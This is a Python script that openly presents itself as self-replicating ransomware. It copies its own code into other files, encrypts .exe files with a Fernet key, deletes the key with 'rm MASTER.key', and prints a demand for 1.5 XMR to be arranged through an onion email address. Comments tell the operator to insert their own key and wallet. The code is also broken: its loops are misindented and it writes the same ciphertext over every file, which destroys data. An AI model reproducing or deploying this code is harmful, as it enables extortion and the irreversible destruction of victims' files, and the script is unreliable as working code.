import subprocess
import ast
import http.server
import os
import glob
from cryptography.fernet import Fernet
import sys


###							THIS IS THE REPLICATING PART OF THE SCRIPT

virus_code = []

with open(sys.argv[0], 'r') as f:
	lines = f.readlines()

self_replicating_part = False
for line in lines:
	if line == "# VIRUS SAYS HI!\n":
		self_replicating_part = True
	if not self_replicating_part:
		virus_code.append(line)
	if line == "# VIRUS SAYS BYE\n":
		break

python_files = glob.glob('*.exe') + glob.glob('*.exew')

for file in python_files:
	with open(file, 'r') as f:
		file_code = f.readlines()

infected= False

for line in file_code:
	if line == "# VIRUS SAYS HI!\n":
		infected = True
		break

if not infected:
	final_code = []
	final_code.extend(virus_code)
	final_code.extend(file_code)
	with open(file, 'w') as f:
		f.writelines(final_code)
#									END OF THE REPLICATING PART OF THE SCRIPT

#			THIS IS THE MALICIOUS PART OF THE SCRIPT
def malicious_code():

#			v   CHANGE THE NAME OF THIS KEY TO THE KEY YOU JUST GENERATED v		AND PUT IN YOUR XMR WALLET ADDRESS FOR PAYMENT
	name = 'MASTER.key'
	email = 'notYourRealEmailAddress@riseup.onion'
	with open(name, 'rb') as filekey:
		key = filekey.read()
	fernet = Fernet(key)
	executable_files = glob.glob('*.exe') + glob.glob('*.exew')
	for file in executable_files:
		with open(file, 'rb') as file:
			original = file.read()
	encrypted = fernet.encrypt(original)
	for file in executable_files:
		with open(file, 'wb') as encrypted_file:
			encrypted_file.write(encrypted)
#			v	ALSO CHANGE THE NAME OF KEY HERE
	rm = 'rm MASTER.key'
	os.system(rm)
	print('	[!!!]	ALL EXE FILES HAVE BEEN ENCRYPTED	[!!!]')

	print('DO NOT DELETE THE DECRYPTOR PROGRAM, IF YOU DO, I WILL NOT BE ABLE TO DECRYPT YOUR PROGRAMS AFTER PAYMENT')

	print(f'\n \n \n 	PAY 1.5 XMR \n SEND AN EMAIL TO {email} TO RECEIVE THE XMR ADDRESS')


malicious_code()

